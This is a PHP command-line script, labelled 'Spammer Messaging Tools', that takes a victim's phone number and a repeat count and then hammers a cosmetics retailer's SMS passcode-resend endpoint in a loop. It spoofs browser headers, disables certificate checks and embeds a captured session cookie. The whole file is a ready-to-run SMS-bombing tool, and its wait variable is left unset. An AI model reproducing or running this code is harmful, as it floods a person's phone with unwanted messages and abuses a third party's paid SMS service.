<?php
function sophie($nohp, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.sophieparis.com/iregistration/ajax/sendpasscode/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilephone=$nohp&resend=true");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.sophieparis.com/iregistration/member/revalidatesms/');
 $headers = array();
 $headers[] = "Authority: www.sophieparis.com";
 $headers[] = "Accept: */*";
 $headers[] = "X-Newrelic-Id: VQ8HV15WCBABV1RWDgcGUVM=";
 $headers[] = "Sec-Fetch-Dest: empty";
 $headers[] = "X-Requested-With: XMLHttpRequest";
 $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36";
 $headers[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
 $headers[] = "Origin: https://www.sophieparis.com";
 $headers[] = "Sec-Fetch-Site: same-origin";
 $headers[] = "Sec-Fetch-Mode: cors";
 $headers[] = "Accept-Language: en-US,en;q=0.9";
 $headers[] = "Cookie: _ga=GA1.3.1653073049.1583108686; _gid=GA1.3.1507369321.1583108686; _hjid=c27f2024-b259-41fa-9ce9-73d8b5571b8f; toky_state=minimized; ins-gaSSId=e59f405d-6429-96d0-9eaf-2b92b66527a9_1583108691; _hjIncludedInSample=1; scarab.visitor=%222EAF352B0D1C530F%22; _fbp=fb.1.1583108698613.1373126036; frontend_cid=pimZ7VtcIRKBM2oi; am_promo_notification=0; frontend=laskgth5m8mkqfhjclgsilv9f0; MGT_NO_CACHE=1; insdrSV=11";
        
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 $server_output = curl_exec ($ch);
 curl_close ($ch);
 echo $server_output."\n";
 sleep($wait);
 $x++;
 flush();
    }
}
echo "

                 _              _
  _____  ___ __ (_)_ __ ___  __| |
 / _ \ \/ / '_ \| | '__/ _ \/ _` |
|  __/>  <| |_) | | | |  __/ (_| |
 \___/_/\_\ .__/|_|_|  \___|\__,_|
          |_|

Spammer Messaging Tools.
\n";
        echo "Phone Number : ";
        $nomor = trim(fgets(STDIN));
        echo "Looping : ";
        $jumlah = trim(fgets(STDIN));
        echo "result.\n";
        $execute = sophie($nomor, $jumlah, $jeda);
        print $execute;
        echo "end
\n";
?>
